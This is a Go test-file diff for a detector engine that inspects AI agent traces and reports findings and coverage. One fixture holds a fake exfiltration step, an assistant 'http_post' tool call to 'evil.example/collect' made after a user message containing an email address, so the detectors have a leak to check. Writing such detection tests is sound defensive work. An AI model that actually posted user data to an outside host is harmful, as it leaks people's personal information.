@@ -91,3 +91,63 @@ func TestDetectorPanicIsAFailure(t *testing.T) {
 		t.Fatalf("a detector panic must surface as a detector failure: %v", err)
 	}
 }
+
+func engineTrace() *observation.Trace {
+	return &observation.Trace{
+		ID:        "trace_1",
+		Principal: observation.Principal{ProjectID: "p1", AgentKeyID: "k1", TrustLevel: 1},
+		Turns: []observation.Turn{
+			{Index: 0, Role: observation.RoleUser, Items: []observation.Item{{
+				Kind: observation.ItemText, Origin: observation.OriginUser, Trust: observation.Trusted,
+				Text: observation.NewValue("mail me@example.com", "mail [EMAIL_1]", nil, nil),
+			}}},
+			{Index: 1, Role: observation.RoleAssistant, Items: []observation.Item{{
+				Kind: observation.ItemToolCall, Origin: observation.OriginAssistant, Trust: observation.Trusted,
+				ToolCall: &observation.ToolCall{ID: "call_tool", Name: "http_post", Kind: "function",
+					Arguments: observation.NewValue(`{"url":"https://evil.example/collect"}`, `{"url":"https://evil.example/collect"}`, nil, nil),
+					Input:     map[string]any{"url": "https://evil.example/collect"},
+					Sink:      observation.SinkExternalSend,
+				},
+			}}},
+		},
+	}
+}
+
+func TestEngineReportsAnEmptyRegistryAsComplete(t *testing.T) {
+	engine := NewEngine(NewRegistry())
+	result := engine.Evaluate(context.Background(), engineTrace(), Options{})
+	if len(result.Errors) != 0 || len(result.Findings) != 0 {
+		t.Fatalf("empty registry produced work: %+v", result)
+	}
+	if !BuildCoverage(result).Complete {
+		t.Fatal("an empty detector set ran completely")
+	}
+}
+
+func TestDetectorIncompleteMakesCoverageIncomplete(t *testing.T) {
+	trace := &observation.Trace{
+		Tools: []observation.ToolSpec{{Name: "read", Kind: "function", Parameters: map[string]any{
+			"type": "object", "properties": map[string]any{"path": map[string]any{"$ref": "#/definitions/path"}},
+		}}},
+		Turns: []observation.Turn{{Role: observation.RoleAssistant, Items: []observation.Item{{
+			Kind: observation.ItemToolCall, Origin: observation.OriginAssistant, Trust: observation.Trusted,
+			Locator: observation.Locator{Section: "response"},
+			ToolCall: &observation.ToolCall{ID: "call_1", Name: "read", Kind: "function",
+				Arguments: observation.NewValue(`{"path":"/tmp/x"}`, `{"path":"/tmp/x"}`, nil, nil),
+				Input:     map[string]any{"path": "/tmp/x"}},
+		}}}},
+	}
+	engine := NewEngine(DefaultRegistry())
+	result := engine.Evaluate(context.Background(), trace, Options{})
+	coverage := BuildCoverage(result)
+	if coverage.Complete || len(coverage.Errors) == 0 {
+		t.Fatalf("an incomplete detector must make coverage incomplete: %+v", coverage)
+	}
+	found := false
+	for _, finding := range result.Findings {
+		found = found || finding.Code == CodeAnalysisIncomplete
+	}
+	if !found {
+		t.Fatal("the incomplete finding was lost")
+	}
+}
